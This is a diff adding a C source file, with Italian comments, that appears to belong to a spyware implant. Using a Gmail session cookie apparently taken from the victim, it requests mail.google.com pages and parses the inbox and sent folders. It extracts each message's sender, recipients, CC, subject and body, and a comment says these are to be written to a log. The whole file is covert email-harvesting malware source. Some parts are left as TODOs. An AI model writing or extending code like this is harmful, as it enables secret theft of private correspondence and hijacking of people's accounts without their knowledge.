@@ -1,0 +1,186 @@
+#include <windows.h>
+#include <stdio.h>
+#include <time.h>
+#include "..\common.h"
+#include "..\LOG.h"
+#include "SocialMain.h"
+#include "NetworkHandler.h"
+
+#define GM_GLOBAL_IDENTIFIER "var GLOBALS=["
+#define GM_MAIL_IDENTIFIER ",[\"^all\",\""
+#define GM_INBOX_IDENTIFIER "inbox"
+#define GM_OUTBOX_IDENTIFIER "sent"
+
+#define FREE_INNER_PARSING(x) if (!x) { SAFE_FREE(r_buffer_inner); break; }
+#define FREE_PARSING(x) if (!x) { SAFE_FREE(r_buffer); return SOCIAL_REQUEST_BAD_COOKIE; }
+
+DWORD ParseMailBox(char *mbox, char *cookie, char *ik_val, DWORD last_tstamp)
+{
+	DWORD ret_val;
+	BYTE *r_buffer = NULL;
+	BYTE *r_buffer_inner = NULL;
+	DWORD response_len;
+	char *ptr, *ptr_inner, *ptr_inner2;
+	WCHAR mail_request[256];
+	char mail_id[17];
+	char src_add[1024], dest_add[1024], cc_add[1024], subject[1024];
+	char tmp_buff[256];
+
+	CheckProcessStatus();
+	// Prende la lista dei messaggi per la mail box selezionata
+	_snwprintf_s(mail_request, sizeof(mail_request)/sizeof(WCHAR), L"/mail/?ui=2&ik=%S&view=tl&start=0&num=70&rt=c&search=%S",ik_val, mbox);
+	ret_val = HttpSocialRequest(L"mail.google.com", L"GET", mail_request, 443, NULL, 0, &r_buffer, &response_len, cookie);
+	if (ret_val != SOCIAL_REQUEST_SUCCESS)
+		return ret_val;
+	ptr = (char *)r_buffer;
+
+	// Parsa la lista dei messaggi
+	for(;;) {
+		CheckProcessStatus();
+		ptr = strstr(ptr, GM_MAIL_IDENTIFIER); 
+		if (!ptr) 
+			break;
+		memset(mail_id, 0, sizeof(mail_id));
+		memcpy(mail_id, ptr-21, 16);
+		ptr+=strlen(GM_MAIL_IDENTIFIER);
+		if (!atoi(mail_id))
+			continue;
+
+		// XXX Check se lo ha gia' parsato!!!
+		// XXX E salva il timestamp...
+		// XXX ik e' univoco per utente? se si lo posso usare come userid per i timestamp per utente....
+
+		_snwprintf_s(mail_request, sizeof(mail_request)/sizeof(WCHAR), _TRUNCATE, L"/mail/?ui=2&ik=%S&view=cv&th=%S&_reqid=1&rt=c&search=%S", ik_val, mail_id, mbox);
+		
+		ret_val = HttpSocialRequest(L"mail.google.com", L"GET", mail_request, 443, NULL, 0, &r_buffer_inner, &response_len, cookie);
+		if (ret_val != SOCIAL_REQUEST_SUCCESS) {
+			SAFE_FREE(r_buffer);
+			return ret_val;
+		}
+
+		// Parsa il contenuto della mail
+		_snprintf_s(tmp_buff, sizeof(tmp_buff), _TRUNCATE, "[\"ms\",\"%s\",", mail_id);
+		ptr_inner = (char *)r_buffer_inner;
+		ptr_inner = strstr(ptr_inner, tmp_buff); 
+		FREE_INNER_PARSING(ptr_inner);
+		ptr_inner += strlen(tmp_buff);
+
+		// Cerca il quarto parametro da qui
+		for (int i=0; i<4; i++) {
+			ptr_inner = strchr(ptr_inner, ',');
+			FREE_INNER_PARSING(ptr_inner);
+			ptr_inner++;
+		}
+		FREE_INNER_PARSING(ptr_inner);
+		ptr_inner2 = strchr(ptr_inner, ',');
+		FREE_INNER_PARSING(ptr_inner2);
+		*ptr_inner2 = 0;
+		// Legge il mittente
+		_snprintf_s(src_add, sizeof(src_add), _TRUNCATE, "%s", ptr_inner);
+		ptr_inner = ptr_inner2 + 1;
+
+		// Legge il subject
+		_snprintf_s(tmp_buff, sizeof(tmp_buff), _TRUNCATE, "\",[\"%s\",[", mail_id);
+		ptr_inner = strstr(ptr_inner, tmp_buff); 
+		FREE_INNER_PARSING(ptr_inner);
+		*ptr_inner = 0;
+		for(ptr_inner2 = ptr_inner-1; *ptr_inner2!=0; ptr_inner2--) {
+			char *prv_ch = ptr_inner2-1;
+			if (*ptr_inner2=='\"' && *prv_ch!='\\')
+				break;
+		}
+		if (*ptr_inner2 == '\"')
+			ptr_inner2++;
+		_snprintf_s(subject, sizeof(subject), _TRUNCATE, "%s", ptr_inner2);
+		ptr_inner += strlen(tmp_buff);
+		ptr_inner2 = strchr(ptr_inner, ']');
+		FREE_INNER_PARSING(ptr_inner2);
+		*ptr_inner2 = 0;
+		// Legge i destinatari
+		_snprintf_s(dest_add, sizeof(dest_add), _TRUNCATE, "%s", ptr_inner);
+		ptr_inner = ptr_inner2 + 1; 
+		ptr_inner = strstr(ptr_inner, ",[");
+		FREE_INNER_PARSING(ptr_inner);
+		ptr_inner += strlen(",[");
+		ptr_inner2 = strchr(ptr_inner, ']');
+		FREE_INNER_PARSING(ptr_inner2);
+		*ptr_inner2 = 0;
+		// Legge i cc
+		_snprintf_s(cc_add, sizeof(cc_add), _TRUNCATE, "%s", ptr_inner);
+		ptr_inner = ptr_inner2 + 1; 
+
+		// Recupera il body
+		_snprintf_s(tmp_buff, sizeof(tmp_buff), _TRUNCATE, ",\"%s\",\"", subject);
+		ptr_inner = strstr(ptr_inner, tmp_buff); 
+		FREE_INNER_PARSING(ptr_inner);
+		ptr_inner += strlen(tmp_buff);
+		for(ptr_inner2 = ptr_inner; *ptr_inner2!=0; ptr_inner2++) {
+			char *prv_ch = ptr_inner2-1;
+			if (*ptr_inner2=='\"' && *prv_ch!='\\')
+				break;
+		}
+		*ptr_inner2 = 0;
+
+		CheckProcessStatus();
+
+		// A questo punto ho src_add, dest_add, cc_add, subject e il body (in ptr_inner)
+		// XXX Ricostruisco il MIME e scrivo il log
+		//MessageBox(NULL, ptr_inner, subject, MB_OK);	
+		// 
+	
+		SAFE_FREE(r_buffer_inner);
+	}
+		
+	SAFE_FREE(r_buffer);
+	return SOCIAL_REQUEST_SUCCESS;
+}
+
+DWORD HandleGMail(char *cookie)
+{
+	DWORD ret_val;
+	BYTE *r_buffer = NULL;
+	DWORD response_len;
+	WCHAR mail_request[256];
+	char ik_val[32];
+	char *ptr, *ptr2;
+	DWORD last_tstamp;
+
+	// XXX Faccio un bel memory/handle leak
+
+	CheckProcessStatus();
+
+	// XXX
+//	if (!bPM_MailStarted)
+//		return SOCIAL_REQUEST_NETWORK_PROBLEM;
+
+	// Verifica il cookie 
+	swprintf_s(mail_request, L"/mail/?shva=1#%S", GM_INBOX_IDENTIFIER);
+	ret_val = HttpSocialRequest(L"mail.google.com", L"GET", mail_request, 443, NULL, 0, &r_buffer, &response_len, cookie);
+	if (ret_val != SOCIAL_REQUEST_SUCCESS)
+		return ret_val;
+
+	ptr = strstr((char *)r_buffer, GM_GLOBAL_IDENTIFIER);
+	FREE_PARSING(ptr);
+
+	// Cerca il parametro ik (e' il nono)
+	for (int i=0; i<9; i++) {
+		ptr = strchr(ptr, ',');
+		FREE_PARSING(ptr);
+		ptr++;
+	}
+	ptr = strchr(ptr, '\"');
+	FREE_PARSING(ptr);
+	ptr++;
+	ptr2 = strchr(ptr, '\"');
+	FREE_PARSING(ptr2);
+	*ptr2 = 0;
+	_snprintf_s(ik_val, sizeof(ik_val), _TRUNCATE, "%s", ptr);	
+	SAFE_FREE(r_buffer);
+
+	// XXX Carica il last timestamp per questo utente
+	// XXX e lo passa alle due funzioni qui sotto
+	last_tstamp = 0;
+
+	ParseMailBox(GM_OUTBOX_IDENTIFIER, cookie, ik_val, last_tstamp);
+	return ParseMailBox(GM_INBOX_IDENTIFIER, cookie, ik_val, last_tstamp);
+}
